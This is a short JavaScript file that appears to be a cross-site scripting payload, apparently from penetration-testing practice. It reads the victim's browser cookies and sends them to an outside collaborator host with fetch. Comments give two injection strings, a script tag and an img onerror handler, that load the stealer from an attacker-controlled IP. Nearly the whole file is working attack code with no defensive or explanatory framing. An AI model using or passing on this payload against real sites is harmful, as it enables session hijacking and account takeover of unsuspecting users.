let cookie=document.cookie
let encodedCookie=encodeURIComponent(cookie)
fetch ("http://9gqa8nr9zgdmp3xqodu35upx8oef25qu.oastify.com/exfil?data=" + encodedCookie)



//thisworks with <script src="http://192.168.45.233/xssstealcookie.js" ></script>
//or
//<img src/onerror=s=document.createElement('script');s.src='http://192.168.45.233/xssstealcookies.js';document.body.appendChild(s)>
